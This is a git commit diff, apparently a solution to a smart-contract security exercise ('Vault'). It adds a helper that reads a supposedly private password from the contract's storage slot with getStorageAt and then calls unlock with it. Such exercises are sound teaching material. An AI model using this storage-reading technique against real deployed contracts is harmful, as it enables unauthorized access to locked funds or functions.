8f2875f05d65dff2578ec315ae79d39b94fc6a6c
benedictleekw <benedictleekw@gmail.com>
2022-06-08 17:42:27 -0500

    Vault Attack

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -8,6 +8,10 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+  const password = await ethers.provider.getStorageAt(victim.address, 1);
+  
+  const tx = await victim.unlock(password);
+  await tx.wait();
 };
 
 export default helper;
